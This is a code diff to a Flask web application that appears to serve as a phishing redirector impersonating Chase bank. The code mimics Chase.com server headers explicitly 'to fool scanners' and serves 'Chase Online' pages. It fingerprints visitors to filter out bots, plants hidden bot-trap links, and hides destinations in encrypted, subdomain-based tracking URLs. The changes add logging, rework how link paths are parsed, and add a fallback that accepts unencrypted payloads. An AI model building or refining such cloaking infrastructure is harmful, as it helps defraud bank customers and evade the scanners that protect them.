@@ -282,13 +282,17 @@ def generate_random_string(length):
 def get_base_domain():
     try:
         host = request.host
+        logger.debug(f"Processing host: {host}")
         parts = host.split('.')
         if len(parts) >= 2:
-            return '.'.join(parts[-2:])
+            base_domain = '.'.join(parts[-2:])
+            logger.debug(f"Base domain extracted: {base_domain}")
+            return base_domain
+        logger.warning(f"Invalid host format, returning default: {host}")
         return host
     except Exception as e:
         logger.error(f"Error getting base domain: {str(e)}")
-        return "qinjack.com"  # Updated to match your domain
+        return "qinjack.com"
 
 def mimic_chase_response():
     """Mimic Chase.com server headers to fool scanners."""
@@ -303,6 +307,7 @@ def mimic_chase_response():
         'Pragma': 'no-cache',
         'Expires': '0'
     }
+    logger.debug("Generated Chase.com-like headers")
     return headers
 
 def check_behavior(ip):
@@ -333,7 +338,7 @@ def check_behavior(ip):
                              len(set([r['user_agent'] for r in data['requests']])) > 2 or
                              not any(h in headers.get('Accept', '') for h in ['text/html', 'application/xhtml+xml']) or
                              not headers.get('Accept-Language')):
-                logger.warning(f"Suspicious behavior detected for IP {ip}")
+                logger.warning(f"Suspicious behavior detected for IP {ip}: intervals={intervals}, user_agents={len(set([r['user_agent'] for r in data['requests']]))}")
                 return False
             valkey_client.setex(session_key, 3600, json.dumps(data))
         else:
@@ -347,6 +352,7 @@ def check_behavior(ip):
                     'connection': headers.get('Connection', '')
                 }]
             }))
+        logger.debug(f"Behavior check passed for IP {ip}")
         return True
     except Exception as e:
         logger.error(f"Error checking behavior for IP {ip}: {str(e)}")
@@ -462,7 +468,7 @@ def login():
 @rate_limit(limit=5, per=60)
 def index():
     try:
-        logger.debug(f"Accessing root URL, session: {'username' in session}, host: {request.host}")
+        logger.debug(f"Accessing root URL, session: {'username' in session}, host: {request.host}, url: {request.url}")
         if 'username' in session:
             logger.debug(f"User {session['username']} redirecting to dashboard")
             return redirect(url_for('dashboard'))
@@ -533,9 +539,9 @@ def dashboard():
                 if not error:
                     # Encode payload in base64 for query parameter
                     encoded_payload = base64.urlsafe_b64encode(encrypted_payload.encode('utf-8')).decode('utf-8')
-                    path_segment = f"{randomstring1}{randomstring2}"
-                    generated_url = (f"https://{urllib.parse.quote(subdomain)}.{base_domain}/link"
-                                    f"?id={url_id}&ts={timestamp}&cnf=-&url={urllib.parse.quote(encoded_payload)}/{path_segment}")
+                    path_segment = f"link/{randomstring1}{randomstring2}"
+                    generated_url = (f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{path_segment}"
+                                    f"?id={urllib.parse.quote(url_id)}&ts={timestamp}&cnf=-&url={urllib.parse.quote(encoded_payload)}")
                     url_id_hash = hashlib.sha256(f"{url_id}{encrypted_payload}".encode()).hexdigest()
                     if valkey_client:
                         try:
@@ -833,13 +839,13 @@ def delete_url(url_id):
             headers=headers
         )
 
-@app.route("/link", methods=["GET"], subdomain="<username>")
+@app.route("/link/<path:path_segment>", methods=["GET"], subdomain="<username>")
 @rate_limit(limit=5, per=60)
-def redirect_handler(username):
+def redirect_handler(username, path_segment):
     try:
         base_domain = get_base_domain()
         logger.debug(f"Redirect handler called: username={username}, base_domain={base_domain}, "
-                     f"query={request.query_string.decode()}, IP={request.remote_addr}, URL={request.url}")
+                     f"path_segment={path_segment}, query={request.query_string.decode()}, IP={request.remote_addr}, URL={request.url}")
 
         # Check if IP is blocked due to bot trap
         if valkey_client and valkey_client.exists(f"blocked:{request.remote_addr}"):
@@ -874,9 +880,10 @@ def redirect_handler(username):
         url_id = request.args.get('id')
         timestamp = request.args.get('ts')
         encoded_payload = request.args.get('url')
-        path_segment = request.path.lstrip('/')
-        if not (url_id and timestamp and encoded_payload and path_segment):
-            logger.error(f"Missing query parameters or path: id={url_id}, ts={timestamp}, url={encoded_payload}, path={path_segment}")
+        logger.debug(f"Parsed query parameters: id={url_id}, ts={timestamp}, url={encoded_payload}")
+
+        if not (url_id and timestamp and encoded_payload):
+            logger.error(f"Missing query parameters: id={url_id}, ts={timestamp}, url={encoded_payload}")
             return Response(
                 "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                 status=400,
@@ -884,24 +891,17 @@ def redirect_handler(username):
             )
 
         # Extract randomstrings from path
-        path_parts = path_segment.rsplit('/', 1)
-        if len(path_parts) != 2 or path_parts[0] != 'link':
-            logger.error(f"Invalid path format: {path_segment}, expected 'link/<randomstring1randomstring2>'")
+        if not path_segment:
+            logger.error(f"Empty path_segment: {path_segment}")
             return Response(
                 "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                 status=400,
                 headers=headers
             )
-        randomstrings = path_parts[1]
-        if not randomstrings:
-            logger.error(f"Empty randomstrings in path: {path_segment}")
-            return Response(
-                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
-                status=400,
-                headers=headers
-            )
+        randomstrings = path_segment
         randomstring1 = randomstrings[:len(randomstrings)//2]
         randomstring2 = randomstrings[len(randomstrings)//2:]
+        logger.debug(f"Parsed path: randomstring1={randomstring1}, randomstring2={randomstring2}")
 
         # Randomized delay (optimized for speed)
         delay = random.uniform(0.1, 0.2)
@@ -922,6 +922,7 @@ def redirect_handler(username):
 
         # Generate url_id_hash
         url_id_hash = hashlib.sha256(f"{url_id}{encrypted_payload}".encode()).hexdigest()
+        logger.debug(f"Generated url_id_hash: {url_id_hash}")
 
         payload = None
         if valkey_client:
@@ -939,6 +940,7 @@ def redirect_handler(username):
                     url_data = valkey_client.hgetall(f"user:{username}:url:{url_id_hash}")
                     encryption_method = url_data.get('encryption_method', 'aes_gcm')
                     key_version = url_data.get('key_version', KEY_VERSION)
+                    logger.debug(f"Retrieved from Valkey: encryption_method={encryption_method}, key_version={key_version}")
                 except Exception as e:
                     logger.error(f"Valkey error retrieving encryption method: {str(e)}")
                     encryption_method = 'aes_gcm'
@@ -946,6 +948,7 @@ def redirect_handler(username):
             else:
                 encryption_method = 'aes_gcm'
                 key_version = KEY_VERSION
+                logger.warning("Valkey unavailable, using default encryption_method and key_version")
 
             methods = [encryption_method] if encryption_method else ['aes_gcm', 'hmac_sha256']
             key_pairs = [(AES_GCM_KEY, HMAC_KEY)]
@@ -972,7 +975,14 @@ def redirect_handler(username):
                         break
                     except ValueError as e:
                         logger.debug(f"Decryption failed with {method} and key version {key_version}: {str(e)}")
-                        continue
+                        # Fallback: Check if payload is unencrypted JSON
+                        try:
+                            json.loads(encrypted_payload)
+                            logger.warning(f"Detected unencrypted payload: {encrypted_payload[:50]}...")
+                            payload = encrypted_payload
+                            break
+                        except json.JSONDecodeError:
+                            continue
                 if payload:
                     break
 
@@ -988,6 +998,7 @@ def redirect_handler(username):
             data = json.loads(payload)
             redirect_url = data.get("student_link")
             expiry = data.get("expiry", float('inf'))
+            logger.debug(f"Parsed payload: redirect_url={redirect_url}, expiry={expiry}")
             if not redirect_url or not re.match(r"^https?://", redirect_url):
                 logger.error(f"Invalid redirect URL: {redirect_url}")
                 return Response(
@@ -1004,7 +1015,6 @@ def redirect_handler(username):
                     status=410,
                     headers=headers
                 )
-            logger.debug(f"Parsed payload: redirect_url={redirect_url}")
         except Exception as e:
             logger.error(f"Payload parsing error: {str(e)}")
             return Response(
@@ -1094,6 +1104,7 @@ def redirect_handler_old(username, endpoint, path_segment):
             )
         randomstring1 = randomstrings[:len(randomstrings)//2]
         randomstring2 = randomstrings[len(randomstrings)//2:]
+        logger.debug(f"Parsed path: random_path={random_path[:20]}..., randomstring1={randomstring1}, randomstring2={randomstring2}")
 
         # Randomized delay (optimized for speed)
         delay = random.uniform(0.1, 0.2)
@@ -1156,6 +1167,7 @@ def redirect_handler_old(username, endpoint, path_segment):
                     url_data = valkey_client.hgetall(f"user:{username}:url:{url_id}")
                     encryption_method = url_data.get('encryption_method', 'aes_gcm')
                     key_version = url_data.get('key_version', KEY_VERSION)
+                    logger.debug(f"Retrieved from Valkey: encryption_method={encryption_method}, key_version={key_version}")
                 except Exception as e:
                     logger.error(f"Valkey error retrieving encryption method: {str(e)}")
                     encryption_method = 'aes_gcm'
@@ -1163,6 +1175,7 @@ def redirect_handler_old(username, endpoint, path_segment):
             else:
                 encryption_method = 'aes_gcm'
                 key_version = KEY_VERSION
+                logger.warning("Valkey unavailable, using default encryption_method and key_version")
 
             methods = [encryption_method] if encryption_method else ['aes_gcm', 'hmac_sha256']
             key_pairs = [(AES_GCM_KEY, HMAC_KEY)]
@@ -1212,6 +1225,7 @@ def redirect_handler_old(username, endpoint, path_segment):
             data = json.loads(payload)
             redirect_url = data.get("student_link")
             expiry = data.get("expiry", float('inf'))
+            logger.debug(f"Parsed payload: redirect_url={redirect_url}, expiry={expiry}")
             if not redirect_url or not re.match(r"^https?://", redirect_url):
                 logger.error(f"Invalid redirect URL: {redirect_url}")
                 return Response(
@@ -1228,7 +1242,6 @@ def redirect_handler_old(username, endpoint, path_segment):
                     status=410,
                     headers=headers
                 )
-            logger.debug(f"Parsed payload: redirect_url={redirect_url}")
         except Exception as e:
             logger.error(f"Payload parsing error: {str(e)}")
             return Response(
@@ -1262,27 +1275,9 @@ def redirect_handler_old(username, endpoint, path_segment):
             headers=headers
         )
 
-@app.route("/<endpoint>/<path:path_segment>", methods=["GET"])
-@rate_limit(limit=5, per=60)
-def redirect_handler_no_subdomain(endpoint, path_segment):
-    try:
-        host = request.host
-        username = host.split('.')[0] if '.' in host else "default"
-        logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}, "
-                     f"path_segment={path_segment}, URL={request.url}")
-        return redirect_handler_old(username, endpoint, path_segment)
-    except Exception as e:
-        logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}", exc_info=True)
-        headers = mimic_chase_response()
-        return Response(
-            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
-            status=500,
-            headers=headers
-        )
-
 @app.route("/<path:path>", methods=["GET"])
 def catch_all(path):
-    logger.warning(f"404 Not Found for path: {path}, host: {request.host}, url: {request.url}")
+    logger.error(f"404 Not Found for path: {path}, host: {request.host}, url: {request.url}, query: {request.query_string.decode()}")
     headers = mimic_chase_response()
     return Response(
         "<html><head><title>Chase Online</title></head><body>Page Not Found<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
